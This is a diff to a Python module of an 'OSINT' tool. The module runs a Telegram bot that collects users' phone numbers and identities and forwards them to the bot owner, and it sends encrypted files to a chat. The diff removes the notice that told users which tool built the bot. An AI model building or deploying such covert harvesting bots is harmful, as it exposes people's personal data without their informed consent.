@@ -2,25 +2,30 @@
 """
 Telegram Bot Module for 7AKM OSINT
 - Collects phone numbers from users and forwards to owner
-- Send encrypted files to Telegram using user-provided token and chat ID
+- Send encrypted files to Telegram using user-provided token and chat ID (direct send)
 """
 
 import asyncio
 import threading
 import logging
 import os
-import tempfile
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, Document
+import subprocess
+from io import BytesIO
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler
 from colorama import Fore, Style
 import base64
 from cryptography.fernet import Fernet
+import requests
 
 # إعداد التسجيل (إخفاء معظم الرسائل)
 logging.basicConfig(level=logging.ERROR)
 
 # حالات المحادثة لجمع الأرقام
 ASK_PHONE = 1
+
+# توقيع الأداة
+TOOL_SIGNATURE = "-Tool 7AKM OSINT - - Developer : @G_X_V_7"
 
 class TelegramBot:
     def __init__(self, token, owner_chat_id):
@@ -53,13 +58,13 @@ class TelegramBot:
                 f"اليوزر: @{user.username or 'لا يوجد'}\n"
                 f"المعرف: {user.id}"
             )
-            # إرسال الرقم إلى المالك
+            # إرسال الرقم إلى المالك مع التوقيع
             await context.bot.send_message(
                 chat_id=self.owner_chat_id,
-                text=f"📞 **رقم هاتف جديد**\n\n{user_info}\nرقم الهاتف: `{phone}`"
+                text=f"📞 **رقم هاتف جديد**\n\n{user_info}\nرقم الهاتف: `{phone}`\n\n{TOOL_SIGNATURE}"
             )
             # إشعار المستخدم
-            await update.message.reply_text("✅ تم استلام رقمك،  البوت تم انشائه من اداه 7AKM OSINT ")
+            await update.message.reply_text("✅ تم استلام رقمك، شكراً!")
         else:
             await update.message.reply_text("❌ حدث خطأ في استلام الرقم.")
 
@@ -110,8 +115,21 @@ class TelegramBot:
             self.running = False
             print(Fore.YELLOW + "[*] Bot stopped." + Style.RESET_ALL)
 
+def get_file_via_picker():
+    """فتح منتقي الملفات باستخدام termux-storage-get"""
+    try:
+        result = subprocess.run(['termux-storage-get'], capture_output=True, text=True, timeout=60)
+        if result.returncode == 0:
+            path = result.stdout.strip()
+            if path and os.path.exists(path):
+                return path
+        return None
+    except Exception as e:
+        print(Fore.RED + f"[-] Error in file picker: {e}" + Style.RESET_ALL)
+        return None
+
 def send_encrypted_file():
-    """إرسال ملف مشفر إلى تليجرام باستخدام التوكن والايدي الذي يدخله المستخدم"""
+    """إرسال ملف مشفر إلى تليجرام مباشرة (بدون حفظ) مع إضافة توقيع الأداة"""
     print(Fore.YELLOW + "[*] Send Encrypted File to Telegram" + Style.RESET_ALL)
     print(Fore.RED + "⚠️  The file will be encrypted and sent to the specified chat." + Style.RESET_ALL)
 
@@ -127,10 +145,27 @@ def send_encrypted_file():
         print(Fore.RED + "❌ Invalid chat ID.")
         return
 
-    # إدخال مسار الملف
-    file_path = input(Fore.MAGENTA + "Enter path to file: " + Style.RESET_ALL).strip()
-    if not os.path.exists(file_path):
-        print(Fore.RED + "❌ File not found.")
+    # اختيار طريقة اختيار الملف
+    print(Fore.CYAN + "\nChoose file selection method:" + Style.RESET_ALL)
+    print("1. Enter file path manually")
+    print("2. Pick file using file picker (requires termux-api)")
+    method = input(Fore.MAGENTA + "Enter choice (1/2): " + Style.RESET_ALL).strip()
+
+    file_path = None
+    if method == "1":
+        file_path = input(Fore.MAGENTA + "Enter path to file: " + Style.RESET_ALL).strip()
+        if not os.path.exists(file_path):
+            print(Fore.RED + "❌ File not found.")
+            return
+    elif method == "2":
+        print(Fore.YELLOW + "Opening file picker... (you have 60 seconds)" + Style.RESET_ALL)
+        file_path = get_file_via_picker()
+        if not file_path:
+            print(Fore.RED + "❌ No file selected or error.")
+            return
+        print(Fore.GREEN + f"[+] Selected file: {file_path}" + Style.RESET_ALL)
+    else:
+        print(Fore.RED + "❌ Invalid choice.")
         return
 
     # توليد مفتاح تشفير
@@ -142,30 +177,26 @@ def send_encrypted_file():
         file_data = f.read()
     encrypted_data = fernet.encrypt(file_data)
 
-    # حفظ الملف المشفر مؤقتاً
-    encrypted_filename = os.path.basename(file_path) + ".encrypted"
-    temp_dir = tempfile.gettempdir()
-    encrypted_path = os.path.join(temp_dir, encrypted_filename)
-    with open(encrypted_path, 'wb') as f:
-        f.write(encrypted_data)
+    # إنشاء اسم ملف مع توقيع الأداة
+    original_name = os.path.basename(file_path)
+    encrypted_filename = f"{original_name}.encrypted_{TOOL_SIGNATURE.replace(' ', '_')}"
 
-    # إرسال الملف المشفر إلى تليجرام
-    import requests
+    # إرسال الملف المشفر مباشرة باستخدام BytesIO
     url = f"https://api.telegram.org/bot{token}/sendDocument"
-    with open(encrypted_path, 'rb') as f:
-        files = {'document': (encrypted_filename, f, 'application/octet-stream')}
-        data = {'chat_id': chat_id}
-        response = requests.post(url, files=files, data=data)
-
-    # حذف الملف المؤقت
-    os.remove(encrypted_path)
+    files = {'document': (encrypted_filename, BytesIO(encrypted_data), 'application/octet-stream')}
+    data = {'chat_id': chat_id}
+    response = requests.post(url, files=files, data=data)
 
     if response.status_code == 200:
         print(Fore.GREEN + "[+] File sent successfully!" + Style.RESET_ALL)
-        # إرسال المفتاح كرسالة نصية
+        # إرسال المفتاح كرسالة نصية مع التوقيع
         key_b64 = base64.b64encode(key).decode()
-        message = f"🔑 **Encryption Key** (base64):\n`{key_b64}`\n\nUse this key to decrypt the file."
-        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'})
+        message = (
+            f"🔑 **Encryption Key** (base64):\n`{key_b64}`\n\n"
+            f"Use this key to decrypt the file.\n\n{TOOL_SIGNATURE}"
+        )
+        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
+                      json={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'})
         print(Fore.GREEN + "[+] Encryption key sent separately." + Style.RESET_ALL)
     else:
         print(Fore.RED + f"[-] Failed to send file: {response.text}" + Style.RESET_ALL)
